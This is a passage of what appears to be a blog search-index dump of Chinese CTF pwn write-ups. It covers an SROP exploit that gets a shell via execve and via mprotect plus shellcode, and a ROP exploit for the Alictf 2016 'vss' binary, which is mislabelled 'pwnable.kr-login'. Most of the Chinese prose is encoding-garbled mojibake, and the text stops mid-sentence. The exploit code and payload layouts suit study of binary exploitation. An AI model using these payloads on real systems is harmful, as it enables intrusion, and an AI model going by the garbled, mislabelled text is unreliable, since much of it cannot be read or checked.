ä¸ºè¿™é‡Œè®¾ç½®è¯»å…¥åœ°å€æ˜¯é€šè¿‡rspè®¾ç½®çš„ã€‚å¦‚æœå°†rspè®¾ç½®ä¸ºæˆ‘ä»¬æƒ³è¯»å…¥binshçš„æ ˆåœ°å€ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯å¯ä»¥è¯»å…¥binshå­—ç¬¦ä¸²çš„ï¼Œä½†æ˜¯å½“ç¨‹åºè¿è¡Œåˆ°retnæ—¶ï¼Œè·³è½¬çš„æ˜¯binshè¿™ä¸ªåœ°å€ï¼Œè¿™æ˜¯ä¸åˆæ³•çš„ï¼Œæ²¡åŠæ³•è·³è½¬ï¼Œç¨‹åºä¼šå´©æºƒã€‚\n\nè¿™é‡Œå°±è€ƒè™‘ä½¿ç”¨SigreturnFrame()æ¥è¿›è¡Œæ ˆåŠ«æŒï¼Œå°†æ•´ä¸ªæ ˆæŒªç§»åˆ°ç›®çš„åœ°ã€‚\n\n(1)é¦–å…ˆå¸ƒç½®SigreturnFrame()çš„æ ˆç©ºé—´ï¼Œè¿›è¡Œæ ˆåŠ«æŒï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_read = SigreturnFrame() \n#è®¾ç½®readçš„SROPå¸§ï¼Œä¸ä½¿ç”¨åŸå…ˆçš„readæ˜¯å› ä¸ºå¯ä»¥ä½¿ç”¨SROPåŒæ—¶ä¿®æ”¹rspï¼Œå®ç°stack pivot\nframe_read.rax = constants.SYS_read#è°ƒç”¨readè¯»å–payload2\nframe_read.rdi = 0#fdå‚æ•°\nframe_read.rsi = stack_addr#è¯»å–payload2åˆ°rsiå¤„\nframe_read.rdx = 0x300#è¯»å–é•¿åº¦ä¸º0x300\n#è¯»å–çš„å¤§å°\nframe_read.rsp = stack_addr#è®¾ç½®SROPæ‰§è¡Œå®Œçš„rspä½ç½®\n#è®¾ç½®æ‰§è¡ŒSROPä¹‹åçš„rspä¸ºstack_addrï¼Œé‡Œé¢å­˜çš„æ˜¯start_addrï¼ŒretnæŒ‡ä»¤æ‰§è¡Œåä»startå¼€å§‹ã€‚\nframe_read.rip = syscall_addr#è®¾ç½®SROPä¸­çš„ä¸€æ®µä»£ç æŒ‡ä»¤\n```\n\n(2)å‘é€payloadã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload1 = \"\"\npayload1 += p64(start_addr)#è¯»å–payload[8:8+15]ï¼Œè®¾ç½®rax=0xf0\npayload1 += p64(syscall_addr)#åˆ©ç”¨rax=0xf0,è°ƒç”¨SROP\npayload1 += str(frame_read)\nio.send(payload1)\nsleep(3)\nio.send(payload1[8:8+15])\n#ä¸ºraxèµ‹å€¼ä¸º0xf0\nsleep(3)\n```\n\nç¨‹åºè¿è¡ŒSROPè¿‡ç¨‹ä¸­ï¼Œä¼šæ‰§è¡Œreadå‡½æ•°ï¼Œå°†payload2è¯»å–åˆ°stack_addrå¤„ï¼Œæ‰€ä»¥å½“ç¨‹åºè¿è¡Œå®ŒSROPåï¼Œæ ˆé¡¶rspè¢«åŠ«æŒåˆ°stack_addrå¤„ï¼ŒåŒæ—¶stack_addrä¸Šä¿å­˜çš„å†…å®¹æ˜¯payload2ï¼Œé¦–åœ°å€æ˜¯startï¼Œæ‰€ä»¥retnæ‰§è¡Œåä»æ—§ä»startå¼€å§‹ã€‚\n\n(3)è®¾ç½®ç¬¬äºŒæ¬¡çš„SigreturnFrameæ”»å‡»ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_execve = SigreturnFrame()\n#è®¾ç½®execveçš„SROPå¸§ï¼Œæ³¨æ„è®¡ç®—/bin/sh\\x00æ‰€åœ¨åœ°å€\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = stack_addr+0x108\nframe_execve.rip = syscall_addr\n```\n\nè¿™é‡Œçš„0x108æ˜¯è®¡ç®—å‡ºæ¥çš„ï¼Œéœ€è¦è®¡ç®—ä»stack_addråˆ°rdiï¼Œä¹Ÿå°±æ˜¯binshå­—ç¬¦ä¸²çš„è·ç¦»ã€‚ç”±äºä¼ è¿›å»çš„æ˜¯ç»“æ„ä½“ï¼Œå¤§å°ä¸º0xf8ã€‚å‰ä¸€ä¸ªä¾‹å­ä¸­binshå­—ç¬¦ä¸²æ˜¯æ”¾åœ¨str(frameExecve)ä¹‹å‰ï¼Œæ‰€ä»¥æ²¡æœ‰é‚£ä¹ˆå¤§ã€‚è¿™é‡Œå´æ˜¯æ”¾åœ¨str(frame_execve)ä¹‹åï¼Œæ‰€ä»¥ä»stack_addrä¸ºèµ·å§‹ï¼Œstart_addrï¼Œsyscall_addrï¼Œframe_execve)ï¼Œæ€»å…±ä¸º0xf8+0x08*2=0x108ï¼Œè¿™é‡Œä¸å¤ªæ‡‚å¯ä»¥è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ã€‚ä¹Ÿå°±æ˜¯å†ä¸€æ¬¡start_addrè¯»å–å­—ç¬¦ä¸²binshçš„ä½ç½®ã€‚\n\n8.å‘é€payloadï¼Œè¯»å–binshå­—ç¬¦ä¸²ï¼Œgetshellï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload2 = \"\"\npayload2 += p64(start_addr)#å¤„åœ¨stack_addrå¤„ï¼Œè¯»å–payload[8:8+15]ï¼Œè®¾ç½®rax=0xf0\npayload2 += p64(syscall_addr)#å¤„åœ¨stack_addr+0x08,åˆ©ç”¨rax=0xf0,è°ƒç”¨SROP\npayload2 += str(frame_execve)#å¤„åœ¨stack_addr+0x10\npayload2 += \"/bin/sh\\x00\"#å¤„åœ¨stack+0x108å¤„\nio.send(payload2)\nsleep(3)\nio.send(payload2[8:8+15])\nsleep(3)\nio.interactive()\n```\n\n9.å°è¯•ä½¿ç”¨mprotectä¸ºæ ˆå†…å­˜æ·»åŠ å¯æ‰§è¡Œæƒé™xï¼Œä»è€Œshellcodeæ¥getshellã€‚\n\n(1)ç¬¬ä¸€æ®µçš„åŠ«æŒæ ˆå’Œè¯»å–payload2è¿›å…¥åŠ«æŒæ ˆå¤„éƒ½æ˜¯ä¸€æ ·çš„\n\n```\n#æ³¨é‡Šå¤´\n\nframe_read = SigreturnFrame()#è®¾ç½®readçš„SROPå¸§\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = stack_addr\nframe_read.rdx = 0x300\nframe_read.rsp = stack_addr\n#è¯»å–payload2ï¼Œè¿™ä¸ªstack_addråœ°å€ä¸­çš„å†…å®¹å°±æ˜¯startåœ°å€ï¼ŒSROPæ‰§è¡Œå®Œåretè·³è½¬åˆ°start\nframe_read.rip = syscall_addr\n```\n\n(2)ç¬¬äºŒæ®µéœ€è¦è°ƒç”¨mprotectæ¥ä¿®æ”¹æƒé™ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_mprotect = SigreturnFrame()\n#è®¾ç½®mprotectçš„SROPå¸§ï¼Œç”¨mprotectä¿®æ”¹æ ˆå†…å­˜ä¸ºRWX\nframe_mprotect.rax = constants.SYS_mprotect\nframe_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000\nframe_mprotect.rsi = 0x1000\nframe_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC\n#æƒé™ä¸ºR,W,X\nframe_mprotect.rsp = stack_addr\n#åŠ«æŒæ ˆåœ°å€rsp\nframe_mprotect.rip = syscall_addr\n```\n\n(3)æœ€åçš„shellcode:\n\n```\n#æ³¨é‡Šå¤´\n\npayload2 = \"\"\npayload2 += p64(stack_addr+0x10) #å¤„åœ¨stack_addr\n#SROPæ‰§è¡Œå®Œåï¼Œretåˆ°stack_addr+0x10å¤„çš„ä»£ç ï¼Œå³æ‰§è¡Œshellcode\npayload2 += asm(shellcraft.amd64.linux.sh())#å¤„åœ¨stack_addr+0x10\nio.send(payload2)\nsleep(3)\nio.interactive()\n```\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"pwnable.kr-login","url":"/2021/08/14/Alictf 2016-vss/","content":"\n1.å¸¸è§„checksec,å¼€äº†NXä¿æŠ¤ï¼ŒIDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œå‘ç°ç¨‹åºç‰¹åˆ«å¥‡æ€ªï¼Œæ²¡æœ‰mainå‡½æ•°ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æŠŠelfæ–‡ä»¶çš„ç¬¦å·ä¿¡æ¯ç»™æ¸…é™¤äº†ã€‚æ­£å¸¸æƒ…å†µä¸‹ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶é‡Œé¢å¸¦æœ‰ç¬¦å·ä¿¡æ¯å’Œè°ƒè¯•ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯åœ¨è°ƒè¯•çš„æ—¶å€™éå¸¸æœ‰ç”¨ï¼Œä½†æ˜¯å½“æ–‡ä»¶å‘å¸ƒæ—¶ï¼Œè¿™äº›ç¬¦å·ä¿¡æ¯ç”¨å¤„ä¸å¤§ï¼Œå¹¶ä¸”ä¼šå¢å¤§æ–‡ä»¶å¤§å°ï¼Œè¿™æ—¶å¯ä»¥æ¸…é™¤æ‰å¯æ‰§è¡Œæ–‡ä»¶çš„ç¬¦å·ä¿¡æ¯å’Œè°ƒè¯•ä¿¡æ¯ï¼Œæ–‡ä»¶å°ºå¯¸å¯ä»¥å¤§å¤§å‡å°ã€‚å¯ä»¥ä½¿ç”¨stripå‘½ä»¤å®ç°æ¸…é™¤ç¬¦å·ä¿¡æ¯çš„ç›®çš„ã€‚\n\n2.è™½ç„¶è¿™é‡Œæ‰¾ä¸åˆ°mainå‡½æ•°ï¼Œä½†æ˜¯startå‡½æ•°æ˜¯ä¸€å®šä¼šå­˜åœ¨çš„ï¼Œç”±äºstartæŒ‰F5åæ±‡ç¼–ä¸æˆåŠŸï¼Œæ‰€ä»¥è¿™é‡Œè¿›å…¥åˆ°startå‡½æ•°çš„æ±‡ç¼–ä»£ç ä¸­ï¼š\n\nç”±äºstartä¸­çš„ç»“æ„åŸºæœ¬å›ºå®šï¼Œæœ€ååŸºæœ¬ä¸Šéƒ½æ˜¯å¦‚ä¸‹ï¼Œæ‰€ä»¥è¿™é‡Œsub_4011B1å…¶å®å°±æ˜¯mainå‡½æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥ç‚¹è¿›å»çœ‹äº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nmov     rdi, offset main\ncall    _libc_start_main\n```\n\n2.è¿™é‡Œçš„mainå‡½æ•°å¯ä»¥åæ±‡ç¼–æˆåŠŸï¼Œé‚£ä¹ˆå°±å¼€å§‹åˆ†ææ¼æ´ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯sub_4374E0ï¼Œè¿›å»ä¹‹åå¦‚ä¸‹\n\n```\n#æ³¨é‡Šå¤´\n\nsigned __int64 result; // rax\nresult = 37LL;\n__asm { syscall; LINUX - sys_alarm }\n```\n\nä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å·37ï¼Œä¹Ÿå°±æ˜¯0x25ï¼Œä»£è¡¨alarmã€‚\n\n3.sub_408800å­—ç¬¦ä¸²å•å‚æ•°ï¼Œä¸”å‚æ•°éƒ½è¢«æ‰“å°åˆ°å±å¹•ä¸Šï¼Œå¯ä»¥çŒœæµ‹æ˜¯putsã€‚sub_437EA0è°ƒç”¨sub_437EBDï¼Œå¹¶ä¸”fdå‚æ•°ä½ä¸º0å·ï¼Œä¸”æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œçœ‹ä¸‹æ±‡ç¼–ä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov       eax, 0\nsyscall;  LINUX - sys_read\n```\n\nè°ƒç”¨0å·syscallï¼Œæ¨æµ‹ä¸ºreadå‡½æ•°ã€‚(ç³»ç»Ÿè°ƒç”¨å·æœ‰)\n\n4.è¿›å…¥sub_40108Eå‡½æ•°ä¸­åˆ†æï¼Œè¿™ä¸ªå‡½æ•°å¤„ç†äº†æˆ‘ä»¬çš„è¾“å…¥ï¼Œå¯ä»¥è¯´å°±æ˜¯å…³é”®å‡½æ•°äº†ã€‚çœ‹åŠå¤©å•¥ä¹Ÿæ²¡çœ‹æ‡‚ï¼Œç›´æ¥ä¸Šè°ƒè¯•ã€‚å…ˆè¾“å…¥åå‡ ä¸ªAçœ‹çœ‹ï¼Œå‘ç°ç»è¿‡sub_400330å‡½æ•°ä¹‹åï¼Œå†…å­˜ä¸­è¾“å…¥çš„Aï¼Œä¹Ÿå°±æ˜¯a1å¤„çš„å†…å®¹è¢«å¤åˆ¶åˆ°äº†v2ï¼Œè¿™é‡Œå…ˆçŒœæµ‹æ˜¯ä¸ªç±»ä¼¼strncpyå‡½æ•°çš„ä¸œè¥¿ã€‚ç„¶åçœ‹å†…å®¹ï¼Œæ—¢ç„¶å±€éƒ¨å˜é‡v2åªæœ‰0x40,è€Œè¿™ä¸ªå¤åˆ¶å‡½æ•°çš„çš„å‚æ•°æœ‰80,ä¹Ÿå°±æ˜¯0x50ï¼Œå¤šäº†0x10ã€‚é‚£ä¹ˆå†è°ƒè¯•çœ‹çœ‹ï¼Œè¾“å…¥0x48ä¸ªå­—èŠ‚Aï¼Œå‘ç°sub_40108Eå‡½æ•°çš„ebpè¢«æˆ‘ä»¬æ”¹æ‰äº†ï¼š\n\nsub_400330((__int64)&v2, a1, 80LL);\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549889.jpeg)\n\nä½†æ˜¯ç¨‹åºæ¥ç€è¿è¡Œä¸‹å»å´ä¸å¤ªè¡Œï¼Œé™·å…¥äº†å¾ªç¯ï¼Œç„¶åä¸€ç›´è¿è¡Œåå´©æºƒï¼Œè¿ä¹‹åçš„read(v8, (__int64)&v3, 40LL);è¿™æ®µreadä»£ç éƒ½æ²¡æœ‰è¿è¡Œã€‚\n\n5.å†è§‚å¯Ÿä¸‹ç¨‹åºï¼Œæœ‰ä¸ªä»£ç æœ‰æ„æ€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsub_400330((__int64)&v2, a1, 0x50LL);\nif ( (_BYTE)v2 == 'p' && BYTE1(v2) == 'y' )\n    return 1LL;\n```\n\nåœ¨å¤åˆ¶å®Œå­—ç¬¦ä¸²ä¹‹åè¿›å…¥ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œå¦‚æœå¼€å¤´æ˜¯pyï¼Œå°±ç›´æ¥retnï¼Œä¸ç»è¿‡ä¸‹é¢ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œå…¨å¯ä»¥åœ¨è¿™å°±ç›´æ¥è¿”å›ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªreturnæœ‰æ²¡æœ‰æ±‡ç¼–æŒ‡ä»¤é‡Œçš„leaveæ“ä½œå‘¢ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£rspä»ç„¶åœ¨æœ€å‰é¢ï¼Œä¸ä¼šè·³è½¬åˆ°è¿”å›åœ°å€çš„åœ°æ–¹ï¼Œçœ‹æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æœ€åæ˜¯é€šè¿‡åˆ¤æ–­åè·³è½¬åˆ°äº†locret_40011AFï¼Œè€Œè¿™æ®µåœ°å€é‡Œå°±æ˜¯leaveå’Œretnçš„æ±‡ç¼–æ“ä½œï¼Œèƒ½å¤Ÿå°†rspæ‹‰åˆ°è¿”å›åœ°å€å¤„ï¼Œé‚£ç›´æ¥returnå°±å®Œäº‹äº†ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550236.jpeg)\n\n6.é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥åˆ¤æ–­å‡ºæ¥æˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«å¤åˆ¶åˆ°v2è¿™ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œå¹¶ä¸”æœ€å¤š0x50ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤å¼€rbpï¼Œæˆ‘ä»¬å¯ä»¥å†æ§åˆ¶ä¸€ä¸ªè¯¥å‡½æ•°çš„è¿”å›åœ°å€ã€‚é‚£ä¹ˆå¼€å§‹å°è¯•å‘—ã€‚ç”±äºåªæœ‰ä¸€ä¸ªè¿”å›åœ°å€ï¼Œæ²¡æœ‰åé—¨ç¨‹åºï¼Œæœ€å…ˆæƒ³åˆ°çš„è‚¯å®šæ˜¯onegadgetï¼Œä½†æ˜¯ä¸çŸ¥é“libcç‰ˆæœ¬ï¼Œæ²¡åŠæ³•onegadgetã€‚é‚£åªæœ‰ä¸€ä¸ªè¿”å›åœ°å€å¯ä»¥åšä»€ä¹ˆï¼Œé‚£ä¹ˆåªæœ‰æ ˆåŠ«æŒäº†ã€‚å…¶å®ƒWPå¤§å¤šéƒ½æ˜¯æŠ¬é«˜rspï¼Œæˆ‘æƒ³å¯ä¸å¯ä»¥é™ä½rspï¼Œé€šè¿‡ä¸€æ¬¡payloadæ¥getshellï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ROPgadgetæœç´¢sub rspï¼Œä½†æ˜¯æœå‡ºæ¥çš„éƒ½ä¸å¤ªè¡Œï¼Œè¦ä¹ˆå¤ªå¤§ï¼Œè¶…è¿‡0x50ï¼Œè¦ä¹ˆå°±å¾ˆå¥‡æ€ªã€‚ç„¶åä¸€èˆ¬æ ˆåŠ«æŒéœ€è¦ä¸€ä¸ªretæ¥æ¥ç€æ§åˆ¶ç¨‹åºæµï¼Œè¿™é‡Œä¹Ÿæ²¡æœåˆ°ã€‚åŒæ—¶ç”±äºä½¿ç”¨çš„å¤åˆ¶å‡½æ•°ç»è¿‡è°ƒè¯•å°±æ˜¯strncpyï¼Œå­—ç¬¦ä¸²é‡Œä¸èƒ½æœ‰\\x00ï¼Œå¦åˆ™ä¼šè¢«å½“åšå­—ç¬¦ä¸²æˆªæ–­ä»è€Œæ— æ³•å¤åˆ¶æ»¡0x50å­—èŠ‚åˆ¶é€ å¯æ§æº¢å‡ºï¼Œè¿™å°±æ„å‘³ç€ä»»ä½•åœ°å€(å› ä¸ºåœ°å€åŸºæœ¬éƒ½ä¼šåœ¨æœ€å¼€å§‹å¸¦ä¸Š00)éƒ½ä¸èƒ½è¢«å†™åœ¨å‰0x48ä¸ªå­—èŠ‚ä¸­ï¼Œå½»åº•æ–­äº†sub rspçš„å¿µæƒ³ã€‚æ‰€ä»¥è¿˜æ˜¯æŠ¬é«˜æ ˆå§ã€‚ä½†æ˜¯æŠ¬é«˜æ ˆä¹Ÿæœ‰ç‚¹é—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„è¢«å¤åˆ¶çš„åªæœ‰0x50ä¸ªå­—èŠ‚ï¼ŒæŠ¬é«˜æœ‰å•¥ç”¨ï¼Œä¸å¯æ§å•Šã€‚ç„¶åå°±æƒ³åˆ°ä¹‹å‰çš„readå‡½æ•°ï¼Œè¯»äº†400ä¸ªå­—èŠ‚ï¼Œè€Œç´§æ¥ç€å°±æ˜¯è°ƒç”¨è¯¥å‡½æ•°ã€‚åˆšå¥½å±€éƒ¨å˜é‡v2ç¬¬ä¸€ä¸ªè¢«å‹æ ˆï¼Œä¸sub_40108Eå‡½æ•°æ ˆçš„æ ˆåº•ç´§ç´§æŒ¨åœ¨ä¸€èµ·ï¼Œä¹Ÿå°±æ˜¯è¯´è¶Šè¿‡sub_40108Eå‡½æ•°æ ˆçš„æ ˆåº•å’Œè¿”å›åœ°å€å°±å¯ä»¥ç›´æ¥æ¥åˆ°mainå‡½æ•°æ ˆã€‚è€Œmainå‡½æ•°æ ˆä¸­åˆåªæœ‰ä¸€ä¸ªæˆ‘ä»¬è¾“å…¥çš„å±€éƒ¨å˜é‡v4ï¼Œæ‰€ä»¥sub_40108Eå‡½æ•°æ ˆçš„è¿”å›åœ°å€ä¹‹åçš„ç¬¬ä¸€ä¸ªåœ°å€å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å±€éƒ¨å˜é‡v4çš„åœ°å€ã€‚(è¿™é‡Œé€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥å‘ç°)\n\n7.é‚£ä¹ˆç»è¿‡è®¡ç®—ï¼Œå…¶å®åªè¦æœ‰ä¸€ä¸ªpop,retæ“ä½œï¼Œè®©rspæŠ¬é«˜ä¸€ä¸‹å°±å¯ä»¥åˆ°è¾¾æˆ‘ä»¬è¾“å…¥çš„é¦–åœ°å€ã€‚ä½†æ˜¯ç”±äºç»è¿‡å‰é¢åˆ†æï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºå¼€å¤´è¾“å…¥pyæ¥ä½¿å¾—è¯¥å‡½æ•°ç›´æ¥returnï¼Œé‚£ä¹ˆå¦‚æœåªæ˜¯ä¸€ä¸ªpop,retæ“ä½œï¼Œé‚£ä¹ˆç¨‹åºç¬¬ä¸€ä¸ªæ‰§è¡Œçš„ä»£ç å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å¼€å¤´ï¼ŒåŒ…å«äº†pyçš„å¼€å¤´ï¼Œè¿™å°±å®Œå…¨ä¸å¯æ§äº†ï¼Œå¼€å¤´å¦‚æœæ˜¯pyé‚£æ€ä¹ˆè®¡ç®—æ‰èƒ½æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€å‘¢ã€‚\n\n8.é‚£ä¹ˆå°±åªèƒ½æŸ¥æ‰¾add rspï¼Œåªè¦æ»¡è¶³add rsp 0x50ä¹‹ä¸Šå°±å¯ä»¥å®Œå…¨æ“æ§äº†ã€‚è¿™é‡Œè‡³å°‘éœ€è¦0x50ä¹Ÿæ˜¯å› ä¸ºè¿™æ˜¯strncpyï¼Œä¸èƒ½å°†åœ°å€å†™åˆ°å‰0x48ä¸ªå­—èŠ‚ï¼Œå¦åˆ™ä¼šæˆªæ–­ï¼Œè€Œæœ€åè¿”å›åœ°å€çš„è¦†ç›–å¯ä»¥è¢«å®Œå…¨å¤åˆ¶æ˜¯è¿™é‡Œæœ¬æ¥å°±æ˜¯ä¸€ä¸ªè¿”å›åœ°å€ï¼Œä¿å­˜çš„å†…å®¹åº”è¯¥æ˜¯00401216ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰call sub_40108Eçš„ä¸‹ä¸€æ®µåœ°å€ã€‚è¿™é‡Œåœ¨å¤åˆ¶çš„æ—¶å€™è‚¯å®šè¢«æˆªæ–­äº†ï¼Œä½†æ˜¯ç”±äºæœ¬æ¥å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯ç”¨çš„åœ°å€ï¼Œæˆªæ–­äº†è¦†ç›–çš„ä¹Ÿåªæ˜¯å°†401216æ¢æˆäº†add rsp 0x58;retè¿™ä¸ªåœ°å€(å¦‚æœæˆ‘ä»¬çš„add rspçš„æœ‰æ•ˆåœ°å€åœ°æ–¹åŒ…å«äº†00ï¼Œé‚£æŒ‡å®šä¼šå‡ºé”™)ã€‚é‚£ä¹ˆpayloadçš„è¯­å¥åº”è¯¥æ˜¯payload = \"py\" + \"a\"*(0x48-0x02) + add_rsp_addr + padding + å®é™…æ§åˆ¶ä»£ç ã€‚\n\n9.åˆ©ç”¨ROPgadgetæœç´¢add espçš„ç›¸å…³å†…å®¹ï¼Œå¯ä»¥æŸ¥åˆ°ä¸€ä¸ªåœ°å€0x46f205ï¼Œæ“ä½œæ˜¯add rsp, 0x58; retï¼Œè¿™æ ·å°±å¯ä»¥é¡ºåˆ©å°†æ ˆæŠ¬å‡åˆ°0x58çš„åœ°æ–¹ï¼Œæ‰€ä»¥payloadçš„ç»„æˆåº”è¯¥æ˜¯ï¼špayload = â€œpyâ€ + â€œaâ€*0x46 + p64(0x46f205) + â€œaâ€*8 + p64(addr2)+...(a*8æ˜¯ç”¨æ¥å¡«å……çš„ï¼Œå› ä¸ºæŠ¬å‡åˆ°äº†0x58å¤„ï¼Œå¤åˆ¶ä¹‹å0x50å¤„æ˜¯ä¸€æ®µç©ºç™½åœ°æ–¹ï¼Œæ‰€ä»¥è¿˜éœ€è¦å¡«å……ä¸€ä¸‹ä½¿p64(addr2)èƒ½é¡ºåˆ©è¢«æŠ¬å‡è‡³0x58å¤„è¢«æ‰§è¡Œ)ã€‚åé¢çš„p64(addr2)å’Œ...å°±æ˜¯æˆ‘ä»¬çš„å¸¸è§„gadgetæ“ä½œäº†ã€‚\n\n10.ç°åœ¨éœ€è¦systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²äº†ã€‚æ²¡æœ‰Libcï¼Œsystemå‡½æ•°å’Œ/bin/shä¹Ÿæ²¡æœ‰ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è¾“å…¥/bin/shå­—ç¬¦ä¸²ï¼Œç„¶åsystemå‡½æ•°éœ€è¦é€šè¿‡syscallæ¥å®ç°ã€‚(64ä½ç¨‹åºä¸‹æ˜¯syscallå‡½æ•°ï¼Œ32ä½ç¨‹åºä¸‹å°±æ˜¯Int 0x80)\n\n11.è¿™é‡Œå…ˆå®Œæˆbinshçš„è¾“å…¥ï¼špayload = p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(pop_rax)+ p64(rax_value) + p64(syscall)å› ä¸ºæ˜¯64ä½ç¨‹åºï¼Œå‡½æ•°ä»å·¦å¾€å³è¯»å–å‚æ•°æ‰€å–å¯„å­˜å™¨ä¾æ¬¡ä¸ºï¼šrdiï¼Œrsiï¼Œrdx, rcx, r8, r9, æ ˆä¼ é€’ï¼Œä½†æ˜¯å®é™…æƒ…å†µä¸­æ˜¯ä»å³å¾€å·¦è¯»å–å‚æ•°ï¼Œä¹Ÿå°±æ˜¯å½“åªæœ‰ä¸‰ä¸ªå‚æ•°æ—¶ï¼Œè¯»å–é¡ºåºåº”è¯¥æ˜¯rdx,rsi,rdiå¯¹åº”çš„ä¸ºread(rdi,rsi,rdx)ã€‚\n\nè¿™é‡Œrdxæ˜¯è¾“å…¥çš„å¤§å°ï¼Œrsiæ˜¯è¾“å…¥çš„å†…å­˜åœ°å€buf(éšä¾¿æ‰¾ä¸€æ®µå¯è¯»å¯å†™çš„å°±è¡Œäº†)ï¼Œrdiæ˜¯fdæ ‡å¿—ä½ï¼Œç”±äºæ˜¯é€šè¿‡syscallè°ƒç”¨ï¼Œæ‰€ä»¥é™¤äº†é…ç½®ä¸‰ä¸ªreadå‡½æ•°å‚æ•°è¿˜éœ€è¦é…ç½®ç³»ç»Ÿè°ƒç”¨å·ï¼Œä¹Ÿå°±æ˜¯raxçš„ä¼ å‚ä¸º0x0ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549806.jpeg)è¿™é‡Œå¦‚æœä¸ä½¿ç”¨syscallï¼Œå…¶å®ä¹Ÿå¯ä»¥ç”¨æˆ‘ä»¬ä¹‹å‰çŒœå‡ºæ¥çš„readå‡½æ•°çš„pltè¡¨ï¼Œåªæ˜¯è¿™æ ·å°±å¯ä»¥ä¸ç”¨è®¾ç½®raxäº†ã€‚\n\nâ–²è¿™é‡Œä¸èƒ½ä½¿ç”¨401202å¤„çš„call readï¼Œå› ä¸ºcallä¼šå‹å…¥ä¸‹ä¸€è¡Œä»£ç çš„ä½œä¸ºreadè¿”å›åœ°å€ï¼Œé‚£æ ·å°±ä¸å¯æ§äº†ã€‚è¿™é‡Œé€‰æ‹©ç³»ç»Ÿè°ƒç”¨æ˜¯å› ä¸ºæ²¡æœ‰readåœ¨gotè¡¨ä¸­çš„çœŸå®åœ°å€ï¼Œä¸ç„¶å…¶å®è°ƒç”¨gotè¡¨åœ°å€ä¹Ÿå¯ä»¥ã€‚\n\n \n\n12.æ¥ç€è°ƒç”¨systemå‡½æ•°ï¼ŒåŒæ ·é‡‡ç”¨syscallç³»ç»Ÿè°ƒç”¨ï¼Œéœ€è¦å‡ ä¸ªå‚æ•°çš„è®¾ç½®rax=59,rdx=0,rsi=0,ï¼ˆè¿™æ˜¯è°ƒç”¨syscallå¿…é¡»çš„å‰ç½®æ¡ä»¶ï¼Œå› ä¸ºæ˜¯linuxè§„å®šçš„ï¼Œå¯ä»¥ä¸Šç½‘æŸ¥ä¸€ä¸‹å°±çŸ¥é“ï¼‰ã€‚éƒ½å¯ä»¥é€šè¿‡Pop gadgetæ¥å®ç°ï¼Œä¹‹åä¼ å‚rdiä¸º&bufï¼Œæœ€åè°ƒç”¨å³å¯getshellã€‚(59ä¸ºç³»ç»Ÿè°ƒç”¨å·)æ‰€ä»¥ç´§æ¥ç€çš„payload = p64(pop_rax) + p64(rax_value) + p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(syscall)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549760.jpeg)è¿™é‡Œå°±å¿…é¡»çš„è®¾ç½®raxä¸º0x3bäº†ã€‚\n\nâ–²shä¸èƒ½ç”¨æ¥ä¼ ç»™syscallå¼€shellï¼Œä½†æ˜¯int 0x80å¯ä»¥ã€‚syscall-64ï¼Œint 0x80-32ã€‚\n\nâ–²syscallæ˜¯åœ¨ä¸Šè¿›å…¥å†…æ ¸æ¨¡å¼çš„é»˜è®¤æ–¹æ³•x86-64ã€‚è¯¥æŒ‡ä»¤åœ¨Intelå¤„ç†å™¨çš„ 